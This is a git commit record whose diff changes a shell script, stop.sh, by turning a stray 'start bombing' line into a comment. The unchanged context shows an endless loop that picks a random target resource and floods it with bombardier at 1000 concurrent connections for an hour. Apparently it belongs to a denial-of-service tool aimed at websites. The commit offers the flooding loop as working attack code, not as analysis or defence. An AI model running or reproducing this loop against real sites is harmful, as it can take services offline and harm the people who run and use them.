111e7294791bdcd5061e1d9c7edcfbbdad4c303b
Dmytro Yaremenko <yaremenko.work@gmail.com>
2022-03-09 18:40:18 +0200

    Apply suggestions from code review
    Co-authored-by: Slava Pustovalov <surg420@gmail.com>

--- stop.sh
+++ stop.sh
@@ -6,6 +6,6 @@ while true; do
   # get random resource from random strategy
   RESOURCE=$(sh "strategies/resources/${STRATEGY}.sh")
 
-  start bombing
+  # start bombing
   bombardier -c 1000 -d 3600s -l "$RESOURCE"
 done
